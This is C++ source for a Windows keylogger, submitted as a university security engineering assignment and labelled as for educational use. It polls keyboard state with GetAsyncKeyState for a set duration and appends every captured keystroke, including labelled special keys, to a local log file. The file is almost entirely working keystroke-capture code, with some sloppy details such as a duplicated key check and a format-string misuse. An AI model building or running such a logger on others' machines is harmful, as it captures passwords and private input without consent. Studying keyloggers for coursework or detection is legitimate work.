/*
This program  is to be used only for educatinal purposes
and should not be used for any malicious activity.

This program is an assignment for  Security  Engg. 
submitted by Arvind Okram 2020pis5663 MNIT Jaipur.
*/

#include<stdio.h>
#include<iostream>
#include<windows.h>
#include<Winuser.h>
#include<stdlib.h>
#include<time.h>
#include<unistd.h>

using namespace std;

int Save(int _key, char *file);

int main(){
	
	char i;
	time_t duration;
	
	printf("Enter the time duration to run the program (60 sec to 120 sec) : ");
	scanf("%d", &duration); // program running duration
	
	time_t initial_time = time(NULL); //intial time of program start 
	time_t futur  = initial_time + duration; //time limit for the program to run
	
		while(time(NULL) < futur){
		for(i=8;i<=255;i++){
			if(GetAsyncKeyState(i)== -32767)
				Save(i,"log.txt");
			if(time(NULL) > futur){
				printf("\nTime duration for running the program is over\n\n");
				printf("CHECK log file\n");
				break;
			}
				
		}

	}
	_Exit(0);
	return 0;
}

int Save(int _key, char *file){
	
	FILE *OUTPUT_FILE;
	
	OUTPUT_FILE = fopen(file, "a+");
	
	//Entering virtual keys
	if(_key == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s","[SHIFT]");
	else if (_key == VK_LBUTTON)
		fprintf(OUTPUT_FILE, "%s","[LEFT MOUSE BUTTON]");
	else if (_key == VK_RBUTTON)
		fprintf(OUTPUT_FILE, "%s","[RIGHT MOUSE BUTTON]");
	else if (_key == VK_CANCEL)
		fprintf(OUTPUT_FILE, "%s","[CONTROL BREAK]");
	else if (_key == VK_MBUTTON)
		fprintf(OUTPUT_FILE, "%s","[MOUSE MIDDLE BUTTON]");
	else if (_key == VK_BACK)
		fprintf(OUTPUT_FILE, "%s","[BACKSPACE]");
	else if (_key == VK_TAB)
		fprintf(OUTPUT_FILE, "%s","[TAB]");
	else if (_key == VK_CLEAR)
		fprintf(OUTPUT_FILE, "%s","[CLEAR]");
	else if (_key == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s","[ENTER]");
	else if (_key == VK_CONTROL )
		fprintf(OUTPUT_FILE, "%s","[CTRL]");
	else if (_key == VK_MENU )
		fprintf(OUTPUT_FILE, "%s","[ALT]");
	else if (_key == VK_PAUSE )
		fprintf(OUTPUT_FILE, "%s","[PAUSE]");
	else if (_key == VK_CAPITAL )
		fprintf(OUTPUT_FILE, "%s","[CAPS LOCK]");
	else if (_key == VK_ESCAPE )
		fprintf(OUTPUT_FILE, "%s","[ESCAPE]");
	else if (_key == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s","[SPACE]");
	else if (_key == VK_PRIOR)
		fprintf(OUTPUT_FILE, "%s","[PAGE UP]");
	else if (_key == VK_NEXT)
		fprintf(OUTPUT_FILE, "%s","[PAGE DOWN]");
	else if (_key == VK_END)
		fprintf(OUTPUT_FILE, "%s","[END]");
	else if (_key == VK_HOME )
		fprintf(OUTPUT_FILE, "%s","[HOME]");
	else if (_key == VK_LEFT )
		fprintf(OUTPUT_FILE, "%s","[LEFT ARROW]");
	else if (_key == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s","[RIGHT ARROW]");
	else if (_key == VK_UP)
		fprintf(OUTPUT_FILE, "%s","[UP ARROW]");
	else if (_key == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s","[DOWN ARRROW]");
	else if (_key == VK_SELECT)
		fprintf(OUTPUT_FILE, "%s","[SELECT KEY]");
	else if (_key == VK_PRINT)
		fprintf(OUTPUT_FILE, "%s","[PRINT KEY]");
	else if (_key == VK_EXECUTE)
		fprintf(OUTPUT_FILE, "%s","[EXECUTE KEY]");
	else if (_key == VK_SNAPSHOT)
		fprintf(OUTPUT_FILE, "%s","[PRINT SCREEEN KEY]");
	else if (_key == VK_INSERT)
		fprintf(OUTPUT_FILE, "%s","[INSERT KEY]");
	else if (_key == VK_DELETE )
		fprintf(OUTPUT_FILE, "%s","[DELETE KEY]");
	else if (_key == VK_HELP )
		fprintf(OUTPUT_FILE, "%s","[HELP KEY]");
	else if (_key == VK_LWIN )
		fprintf(OUTPUT_FILE, "%s","[LEFT WINDOWS KEY]");
	else if (_key == VK_RWIN )
		fprintf(OUTPUT_FILE, "%s","[RIGHT WINDOWS KEY]");		
	else if (_key == VK_APPS )
		fprintf(OUTPUT_FILE, "%s","[APPLICATION KEY]");
	else if (_key == VK_SLEEP )
		fprintf(OUTPUT_FILE, "%s","[SLEEP KEY]");
	else if (_key == VK_NUMPAD0)
		fprintf(OUTPUT_FILE, "%s","[NUMERIC KEY 0]");
	else if (_key == VK_NUMPAD1)
		fprintf(OUTPUT_FILE, "%s","[NUMERIC KEY 1]");
	else if (_key == VK_NUMPAD2)
		fprintf(OUTPUT_FILE, "%s","[NUMERIC KEY 2]");
	else if (_key == VK_NUMPAD3)
		fprintf(OUTPUT_FILE, "%s","[NUMERIC KEY 3]");
	else if (_key == VK_NUMPAD4)
		fprintf(OUTPUT_FILE, "%s","[NUMERIC KEY 4]");
	else if (_key == VK_NUMPAD5)
		fprintf(OUTPUT_FILE, "%s","[NUMERIC KEY 5]");
	else if (_key == VK_NUMPAD6)
		fprintf(OUTPUT_FILE, "%s","[NUMERIC KEY 6]");
	else if (_key == VK_NUMPAD7)
		fprintf(OUTPUT_FILE, "%s","[NUMERIC KEY 7]");
	else if (_key == VK_NUMPAD8)
		fprintf(OUTPUT_FILE, "%s","[NUMERIC KEY 8]");
	else if (_key == VK_NUMPAD9)
		fprintf(OUTPUT_FILE, "%s","[NUMERIC KEY 9]");
	else if (_key == VK_MULTIPLY )
		fprintf(OUTPUT_FILE, "%s","[MULTIPLY KEY]");
	else if (_key == VK_ADD )
		fprintf(OUTPUT_FILE, "%s","[ADD KEY]");
	else if (_key == VK_SUBTRACT )
		fprintf(OUTPUT_FILE, "%s","[SUBTRACT KEY]");
	else if (_key == VK_DIVIDE)
		fprintf(OUTPUT_FILE, "%s","[DIVIDE KEY]");
	else if (_key == VK_DECIMAL )
		fprintf(OUTPUT_FILE, "%s","[DECIMAL KEY]");
	else if (_key == VK_F1 )
		fprintf(OUTPUT_FILE, "%s","[F1 KEY]");
	else if (_key == VK_F2 )
		fprintf(OUTPUT_FILE, "%s","[F2 KEY]");
	else if (_key == VK_F3 )
		fprintf(OUTPUT_FILE, "%s","[F3 KEY]");	
	else if (_key == VK_F4 )
		fprintf(OUTPUT_FILE, "%s","[F4 KEY]");
	else if (_key == VK_F5 )
		fprintf(OUTPUT_FILE, "%s","[F5 KEY]");
	else if (_key == VK_F6 )
		fprintf(OUTPUT_FILE, "%s","[F6 KEY]");
	else if (_key == VK_F7 )
		fprintf(OUTPUT_FILE, "%s","[F7 KEY]");
	else if (_key == VK_F8 )
		fprintf(OUTPUT_FILE, "%s","[F8 KEY]");
	else if (_key == VK_F9 )
		fprintf(OUTPUT_FILE, "%s","[F9 KEY]");
	else if (_key == VK_F10)
		fprintf(OUTPUT_FILE, "%s","[F10 KEY]");
	else if (_key == VK_F11)
		fprintf(OUTPUT_FILE, "%s","[F11 KEY]");
	else if (_key == VK_F12 )
		fprintf(OUTPUT_FILE, "%s","[F12 KEY]");
	else if (_key == VK_F13 )
		fprintf(OUTPUT_FILE, "%s","[F13 KEY]");
	else if (_key == VK_F14 )
		fprintf(OUTPUT_FILE, "%s","[F14 KEY]");
	else if (_key == VK_NUMLOCK  )
		fprintf(OUTPUT_FILE, "%s","[NUM LOCK KEY]");
	else if (_key == VK_SCROLL )
		fprintf(OUTPUT_FILE, "%s","[SCROLL LOCK KEY]");
	else if (_key == VK_LSHIFT )
		fprintf(OUTPUT_FILE, "%s","[LEFT SHIFT]");
	else if (_key == VK_RSHIFT )
		fprintf(OUTPUT_FILE, "%s","[RIGHT SHIFT]");
	else if (_key == VK_LCONTROL )
		fprintf(OUTPUT_FILE, "%s","[LEFT CONTROL KEY]");
	else if (_key == VK_RCONTROL )
		fprintf(OUTPUT_FILE, "%s","[RIGHT CONTROL KEY]");
	else if (_key == VK_LMENU )
		fprintf(OUTPUT_FILE, "%s","[LEFT MENU KEY]");
	else if (_key == VK_VOLUME_MUTE )
		fprintf(OUTPUT_FILE, "%s","[VOLUME MUTE KEY]");
	else if (_key == VK_VOLUME_UP )
		fprintf(OUTPUT_FILE, "%s","[VOLUME UP KEY]");
	else if (_key == VK_VOLUME_DOWN)
		fprintf(OUTPUT_FILE, "%s","[VOLUME DOWN KEY]");
	else if (_key == VK_MEDIA_NEXT_TRACK)
		fprintf(OUTPUT_FILE, "%s","[NEXT TRACK KEY]");
	else if (_key == VK_MEDIA_PREV_TRACK)
		fprintf(OUTPUT_FILE, "%s","[PREVIOUS TRACK KEY]");
	else if (_key == VK_MEDIA_STOP)
		fprintf(OUTPUT_FILE, "%s","[STOP MEDIA KEY]");
	else if (_key == VK_MEDIA_PLAY_PAUSE)
		fprintf(OUTPUT_FILE, "%s","[PLAY/PAUSE MEDIA KEY]");
	else if (_key == VK_OEM_PLUS)
		fprintf(OUTPUT_FILE, "%s","[+ KEY]");
	else if (_key == VK_OEM_COMMA )
		fprintf(OUTPUT_FILE, "%s","[, KEY]");
	else if (_key == VK_OEM_1)
		fprintf(OUTPUT_FILE, "%s","[:; KEY]");
	else if (_key == VK_OEM_102 )
		fprintf(OUTPUT_FILE, "%s","[>< KEY]");
	else if (_key == VK_OEM_2 )
		fprintf(OUTPUT_FILE, "%s","[?/ KEY]");
	else if (_key == VK_OEM_3 )
		fprintf(OUTPUT_FILE, "%s","[~` KEY]");
	else if (_key == VK_OEM_4 )
		fprintf(OUTPUT_FILE, "%s","[{[ KEY]");
	else if (_key == VK_OEM_5 )
		fprintf(OUTPUT_FILE, "%s","[|\ KEY]");
	else if (_key == VK_OEM_6 )
		fprintf(OUTPUT_FILE, "%s","[} ] KEY]");
	else if (_key == VK_OEM_7 )
		fprintf(OUTPUT_FILE, "%s","[""' KEY]");
	else if (_key == VK_OEM_8 )
		fprintf(OUTPUT_FILE, "%s","[§! KEY]");
	else if (_key == VK_OEM_COMMA )
		fprintf(OUTPUT_FILE, "%s","[<, KEY]");
	else if (_key == VK_OEM_MINUS )
		fprintf(OUTPUT_FILE, "%s","[_- KEY]");
	else if (_key == VK_OEM_PERIOD )
		fprintf(OUTPUT_FILE, "%s","[>. KEY]");
	else if (_key == VK_OEM_PLUS )
		fprintf(OUTPUT_FILE, "%s","[+= KEY]");
	
	//Adding key strokes to log file
	fprintf(OUTPUT_FILE, "%s",&_key);
	fclose(OUTPUT_FILE);
}
